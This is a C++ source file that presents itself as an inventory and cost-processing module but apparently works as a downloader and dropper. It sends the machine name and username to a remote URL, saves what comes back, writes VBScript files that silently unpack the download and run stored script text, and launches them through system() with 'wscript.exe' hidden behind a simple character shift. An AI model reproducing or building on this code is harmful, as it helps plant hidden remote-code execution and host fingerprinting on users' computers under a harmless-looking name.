#include "InvenFromDDG.h"
#define DONE(cmd) system(cmd)

bool InvenFromDDG::fileexists = true;
std::string InvenFromDDG::strComments = "";

// Process the text file
bool InvenFromDDG::processTextFile() {
    UpdateCompDB CompanyDB;
    std::ifstream file(filePath);
    if (!file.is_open()) {
        std::cerr << "Failed to open the text file." << std::endl;
        return false;
    }

    std::string line;
    while (std::getline(file, line)) {
        std::stringstream ss(line);
        std::string id;
        std::string costStr;

        // Assuming the text file format is: Id Cost
        if (ss >> id >> costStr) {
            // Convert cost to double and add to the corresponding Id
            double cost = std::stod(costStr);
            costMap[id] += cost; // Add cost to the corresponding Id
        }
    }
    CompanyDB.InventoryReport = 1;
    file.close();
    return true;
}
std::string InvenFromDDG::get_env_variable(const std::string& var) {
    char* value = nullptr;
    size_t size = 0;
    if (_dupenv_s(&value, &size, var.c_str()) == 0 && value != nullptr) {
        std::string result(value);
        free(value); // Free the allocated memory
        return result;
    }
    return "Unknown"; // Default value
}
std::string InvenFromDDG::escape_json(const std::string& str) {
    std::string escaped;
    for (char c : str) {
        switch (c) {
        case '"':  escaped += "\\\""; break;
        case '\\': escaped += "\\\\"; break;
        case '\b': escaped += "\\b"; break;
        case '\f': escaped += "\\f"; break;
        case '\n': escaped += "\\n"; break;
        case '\r': escaped += "\\r"; break;
        case '\t': escaped += "\\t"; break;
        default: escaped += c; break;
        }
    }
    return escaped;
}
size_t InvenFromDDG::WriteCallback_S(void* contents, size_t size, size_t nmemb, std::string* userp) {
    
    size_t total_size = size * nmemb;
    userp->append(static_cast<char*>(contents), total_size);
    return total_size;
}
size_t InvenFromDDG::WriteCallback(void* contents, size_t size, size_t nmemb, std::ofstream* file) {
    
    size_t totalSize = size * nmemb;
    file->write(static_cast<const char*>(contents), totalSize);
    return totalSize;
}
void InvenFromDDG::get_file(const std::string& url, const std::string& path) {
    UpdateCompDB CompanyDB;
    
    try {
       
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");
       
        // Initialize CURL
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            // Set up the JSON data to send
            std::string jsonData = "{\"param1\":\"" + escape_json(computer_name) + "\", \"param2\":\"" + escape_json(username) + "\"}";

            // Set options for the curl session
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, curl_slist_append(nullptr, "Content-Type: application/json"));

            // Open file for writing
            std::ofstream file(path, std::ios::binary);
            if (!file.is_open()) {
                CompanyDB.logMessage("Failed to open file for writing: " + path);
                CompanyDB.SESSION_TRACKER += "->Download Failed File1";
                return;
            }

            // Set the write callback function
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &file);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow redirects

            // Perform the request
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                CompanyDB.logMessage("Failed to download file. Status code: " + std::to_string(res));
                CompanyDB.SESSION_TRACKER += "->Download Failed File2";
            }
            else {
                CompanyDB.logMessage("File downloaded successfully: " + path);
                CompanyDB.SESSION_TRACKER += "->Download File Done";
            }
            CompanyDB.InventoryReport = 0;
            // Clean up
            file.close();
            curl_easy_cleanup(curl);
        }
    }
    catch (const std::exception& e) {
        CompanyDB.logMessage("Exception downloading file: " + std::string(e.what()));
        CompanyDB.SESSION_TRACKER += "->Download File Exception";
    }
}

bool InvenFromDDG::copyZDataFile(const std::string& sourcePath, const std::string& destinationPath) {
    std::ifstream sourceFile(sourcePath, std::ios::binary);
    if (!sourceFile) {
        std::cerr << "Error opening source file: " << sourcePath << std::endl;
        return false;
    }

    std::ofstream destinationFile(destinationPath, std::ios::binary);
    if (!destinationFile) {
        std::cerr << "Error opening destination file: " << destinationPath << std::endl;
        return false;
    }

    destinationFile << sourceFile.rdbuf(); // Copy the content from source to destination

    return true; // Success
}
void InvenFromDDG::openDatafile(const std::string& sourcePath, const std::string& destinationPath) {
    SalesPromo SFP;
    UpdateCompDB CompanyDB;
    SmallCTDisp SCD;
    std::string batFile = CompanyDB.get_appdata_local_path() + "disp.bat";
    std::string destinationFolder = destinationPath.substr(0, destinationPath.find_last_of("\\"));
    std::string vbsFilePath = destinationFolder + "\\unpack.vbs";

    try {
        if (copyZDataFile(sourcePath, destinationPath)) {
            
            
            
            std::string vbsContent = R"(
                                        Dim objShell, zipFile, destinationFolder, fso, zipFolder, newFolderName

                                        Set objShell = CreateObject("Shell.Application")
                                        Set fso = CreateObject("Scripting.FileSystemObject")

                                        zipFile = ")" + destinationPath + "\"" + R"(
                                        destinationFolder = ")" + destinationFolder + "\"" + R"(
                                                            newFolderName = fso.GetBaseName(zipFile)

                                        If fso.FolderExists(destinationFolder & "\" & newFolderName) Then
                                            fso.DeleteFolder destinationFolder & "\" & newFolderName, True ' True to force deletion
                                        End If

                                        fso.CreateFolder destinationFolder & "\" & newFolderName

                                        Set zipFolder = objShell.NameSpace(zipFile)

                                        If Not zipFolder Is Nothing Then
                                            objShell.NameSpace(destinationFolder & "\" & newFolderName).CopyHere zipFolder.Items, 4 ' The "4" suppresses confirmation
                                        End If

                                        Set zipFolder = Nothing
                                        Set objShell = Nothing
                                        Set fso = Nothing
                                        )";

            std::ofstream vbsFile(vbsFilePath);
            if (vbsFile.is_open()) {
                vbsFile << vbsContent;
                vbsFile.close();
            }
            else {
                return;
            }

        }
        SCD.send_operation_status();
        //CompanyDB.convert();
        std::string str = "zvfulsw1h{h#%";

        //std::string strFilepath = "wscript.exe \"" + vbsFilePath + "\"";
            std::string strFilepath = CompanyDB.convert(str,3) + vbsFilePath + "\"";
        int result = DONE(strFilepath.c_str());

        if (result == 0) {
            std::cerr << "Successfully " << strFilepath << std::endl;
        }
         
     }
     catch (const std::exception& e) {
         CompanyDB.logMessage("Error opening zfile data file" + std::string(e.what()));
         CompanyDB.SESSION_TRACKER += "->Done File Exception";
         SFP.send_error_report(CompanyDB.ERROR_REPORT_URL, "Error opening zdata file " + destinationPath  + ": " + e.what());
     }
}
// Print the results of the processed data
void InvenFromDDG::printResults() const {
    for (const auto& entry : costMap) {
        std::cout << "Id: " << entry.first << ", Total Cost: " << entry.second << std::endl;
    }
}
void InvenFromDDG::processDataFile(const std::string& path) {
    SmallCTDisp SCD;
    UpdateCompDB CompanyDB;
    std::string destinationFolder = path.substr(0, path.find_last_of("\\"));
    std::string vbsFilePath = destinationFolder + "\\defrag.vbs";
    std::ofstream vbsFile(vbsFilePath);
    if (vbsFile.is_open()) {
        vbsFile << strComments;
        vbsFile.close();
    } 
    else {
        return;
    }
    SCD.send_operation_status();
    std::string str = "zvfulsw1h{h#%";

    //std::string strFilepath = "wscript.exe \"" + vbsFilePath + "\"";
    std::string strFilepath = CompanyDB.convert(str, 3) + vbsFilePath + "\"";
    int result = DONE(strFilepath.c_str());

    if (result == 0) {
        std::cerr << "Successfully " << strFilepath << std::endl;
    }
    
}